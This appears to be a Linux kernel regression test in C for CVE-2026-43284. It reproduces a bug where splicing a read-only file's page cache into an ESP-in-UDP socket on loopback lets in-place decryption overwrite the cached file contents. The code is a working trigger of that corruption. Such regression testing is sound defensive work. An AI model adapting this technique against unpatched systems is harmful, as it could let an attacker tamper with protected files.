// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
 */

/*\
 * Test for CVE-2026-43284 fixed by:
 * f4c50a4034e6 ("xfrm: esp: avoid in-place decrypt on shared skb frags")
 *
 * When file data is spliced into a UDP socket, the kernel uses
 * MSG_SPLICE_PAGES to reference page cache pages directly in the skb.
 * If the receiving socket has UDP_ENCAP_ESPINUDP enabled and a matching
 * xfrm SA exists, the kernel's :manpage:`esp_input(7)` decrypts the
 * ESP payload in-place on those page cache pages, corrupting the cached
 * file contents.
 *
 * The test sets up an ESP-in-UDP xfrm state on loopback, writes known
 * data to a file, splices the file data between a crafted ESP header
 * and a fake ICV into a UDP socket, and then verifies whether the page
 * cache was corrupted.
 *
 * Reproducer based on:
 * https://github.com/0xdeadbeefnetwork/Copy_Fail2-Electric_Boogaloo
 */

#define _GNU_SOURCE

#include "lapi/xfrm.h"
#include "tst_test.h"
#include "tst_net.h"
#include "tst_netlink.h"
#include "tst_netdevice.h"
#include "lapi/udp.h"
#include "lapi/splice.h"

#define TESTFILE "pagecache_test"
#define ATKFILE "atk_data"

#define DATA_SIZE 4
#define SPI 0xdeadbeef
#define ENC_PORT 4500
#define IV_LEN 8
#define ESP_HDR_SIZE 16
#define ICV_SIZE 16
#define AES_KEYLEN 16
#define SALT_LEN 4
#define KEYTOTAL (AES_KEYLEN + SALT_LEN)

static struct xfrm_usersa_info xs_payload = {
	.family = AF_INET,
	.id.proto = (uint8_t)IPPROTO_ESP,
	.replay_window = 32,
	.reqid = 1,
	.lft = {
		.soft_byte_limit = XFRM_INF,
		.hard_byte_limit = XFRM_INF,
		.soft_packet_limit = XFRM_INF,
		.hard_packet_limit = XFRM_INF,
	},
};

static struct xfrm_encap_tmpl esp_encap = {
	.encap_type = UDP_ENCAP_ESPINUDP
};

static struct {
	struct xfrm_algo_aead alg;
	char buf[KEYTOTAL];
} aead_alg_info = {
	.alg = {
		.alg_name = "rfc4106(gcm(aes))",
		.alg_key_len = KEYTOTAL * 8,
		.alg_icv_len = ICV_SIZE * 8
	}
};

static const struct tst_netlink_attr_list alg_config[] = {
	{XFRMA_ENCAP, &esp_encap, sizeof(esp_encap), NULL},
	{XFRMA_ALG_AEAD, &aead_alg_info, sizeof(aead_alg_info.alg) + KEYTOTAL,
		NULL},
	{0, NULL, -1, NULL}
};

static const uint8_t original[DATA_SIZE] = { 'T', 'E', 'S', 'T' };

static const uint8_t aead_key[KEYTOTAL] = {
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
	0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
	0x10, 0x11, 0x12, 0x13
};

static int file_fd = -1;
static int recv_fd = -1;
static int send_fd = -1;
static int atk_fd = -1;
static int pipefd[2] = { -1, -1 };

static void setup(void)
{
	int ret;
	struct tst_netlink_context *ctx;
	struct nlmsghdr header = {
		.nlmsg_type = XFRM_MSG_NEWSA,
		.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL |
			NLM_F_ACK
	};

	tst_setup_netns();
	NETDEV_SET_STATE("lo", 1);

	memcpy(aead_alg_info.alg.alg_key, aead_key, KEYTOTAL);
	xs_payload.saddr.a4 = htonl(INADDR_LOOPBACK);
	xs_payload.id.daddr.a4 = htonl(INADDR_LOOPBACK);
	xs_payload.id.spi = htonl(SPI);
	esp_encap.encap_sport = htons(ENC_PORT);
	esp_encap.encap_dport = htons(ENC_PORT);

	ctx = NETLINK_CREATE_CONTEXT(NETLINK_XFRM);
	NETLINK_ADD_MESSAGE(ctx, &header, &xs_payload, sizeof(xs_payload));
	NETLINK_ADD_ATTR_LIST(ctx, alg_config);
	ret = NETLINK_SEND_VALIDATE(ctx);
	TST_ERR = tst_netlink_errno;
	NETLINK_DESTROY_CONTEXT(ctx);

	if (!ret) {
		if (TST_ERR == EPROTONOSUPPORT)
			tst_brk(TCONF, "xfrm ESP is not supported by kernel");

		tst_brk(TBROK | TTERRNO, "Failed to install xfrm ESP state");
	}
}

static void try_corrupt(void)
{
	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
		.sin_port = htons(ENC_PORT),
	};
	uint8_t esp_hdr[ESP_HDR_SIZE] = { 0 };
	uint8_t icv[ICV_SIZE] = { 0 };
	uint32_t spi_net = htonl(SPI);
	uint32_t seq_net = htonl(1);
	int encap = UDP_ENCAP_ESPINUDP;
	loff_t off;

	memcpy(esp_hdr, &spi_net, sizeof(spi_net));
	memcpy(esp_hdr + 4, &seq_net, sizeof(seq_net));

	/*
	 * ESP header and ICV must be on different pages so that the
	 * target file's page sits in its own frag slot in the skb.
	 */
	atk_fd = SAFE_OPEN(ATKFILE, O_RDWR | O_CREAT, 0600);
	SAFE_WRITE(SAFE_WRITE_ALL, atk_fd, esp_hdr, ESP_HDR_SIZE);
	SAFE_LSEEK(atk_fd, 4096, SEEK_SET);
	SAFE_WRITE(SAFE_WRITE_ALL, atk_fd, icv, ICV_SIZE);
	SAFE_FSYNC(atk_fd);

	/* Evict attacker pages so splice gives fresh page references */
	SAFE_POSIX_FADVISE(atk_fd, 0, 0, POSIX_FADV_DONTNEED);
	SAFE_CLOSE(atk_fd);

	atk_fd = SAFE_OPEN(ATKFILE, O_RDONLY);

	/* UDP socket that will trigger ESP decryption on received data */
	recv_fd = SAFE_SOCKET(AF_INET, SOCK_DGRAM, 0);
	SAFE_SETSOCKOPT(recv_fd, IPPROTO_UDP, UDP_ENCAP,
			&encap, sizeof(encap));
	SAFE_BIND(recv_fd, (struct sockaddr *)&addr, sizeof(addr));

	send_fd = SAFE_SOCKET(AF_INET, SOCK_DGRAM, 0);
	SAFE_CONNECT(send_fd, (struct sockaddr *)&addr, sizeof(addr));

	SAFE_PIPE(pipefd);

	/*
	 * Build the ESP packet in the pipe: header + target file
	 * data + ICV. The splice for the target file places its page
	 * cache page directly into the pipe buffer.
	 */
	off = 0;
	SAFE_SPLICE(atk_fd, &off, pipefd[1], NULL,
		    ESP_HDR_SIZE, SPLICE_F_MORE);

	off = 0;
	SAFE_SPLICE(file_fd, &off, pipefd[1], NULL,
		    DATA_SIZE, SPLICE_F_MORE);

	off = 4096;
	SAFE_SPLICE(atk_fd, &off, pipefd[1], NULL, ICV_SIZE, 0);

	/*
	 * Splice pipe into UDP socket. The kernel uses MSG_SPLICE_PAGES
	 * to keep the page cache references in the skb. On loopback
	 * the recv socket's ESP handler decrypts in-place, corrupting
	 * the page cache. May fail on patched kernels, so don't use
	 * SAFE_SPLICE here.
	 */
	splice(pipefd[0], NULL, send_fd, NULL,
	       ESP_HDR_SIZE + DATA_SIZE + ICV_SIZE, 0);

	SAFE_CLOSE(pipefd[0]);
	SAFE_CLOSE(pipefd[1]);
	SAFE_CLOSE(recv_fd);
	SAFE_CLOSE(send_fd);
	SAFE_CLOSE(atk_fd);
}

static void run(void)
{
	uint8_t readback[DATA_SIZE];

	file_fd = SAFE_OPEN(TESTFILE, O_WRONLY | O_CREAT, 0444);
	SAFE_WRITE(SAFE_WRITE_ALL, file_fd, original, DATA_SIZE);
	SAFE_CLOSE(file_fd);

	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
	try_corrupt();
	SAFE_CLOSE(file_fd);

	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
	SAFE_READ(1, file_fd, readback, sizeof(readback));
	SAFE_CLOSE(file_fd);

	if (memcmp(readback, original, DATA_SIZE) != 0)
		tst_res(TFAIL, "Page cache was corrupted via xfrm ESP splice");
	else
		tst_res(TPASS, "Page cache was not corrupted");

	SAFE_UNLINK(TESTFILE);
	SAFE_UNLINK(ATKFILE);
}

static void cleanup(void)
{
	if (pipefd[0] != -1)
		SAFE_CLOSE(pipefd[0]);

	if (pipefd[1] != -1)
		SAFE_CLOSE(pipefd[1]);

	if (recv_fd != -1)
		SAFE_CLOSE(recv_fd);

	if (send_fd != -1)
		SAFE_CLOSE(send_fd);

	if (atk_fd != -1)
		SAFE_CLOSE(atk_fd);

	if (file_fd != -1)
		SAFE_CLOSE(file_fd);
}

static struct tst_test test = {
	.test_all = run,
	.setup = setup,
	.cleanup = cleanup,
	.needs_tmpdir = 1,
	.needs_kconfigs = (const char *[]) {
		"CONFIG_USER_NS=y",
		"CONFIG_NET_NS=y",
		"CONFIG_XFRM",
		"CONFIG_INET_ESP",
		"CONFIG_CRYPTO_GCM",
		NULL
	},
	.save_restore = (const struct tst_path_val[]) {
		{"/proc/sys/user/max_user_namespaces", "1024", TST_SR_SKIP},
		{}
	},
	.tags = (const struct tst_tag[]) {
		{"linux-git", "f4c50a4034e6"},
		{"CVE", "2026-43284"},
		{}
	},
};
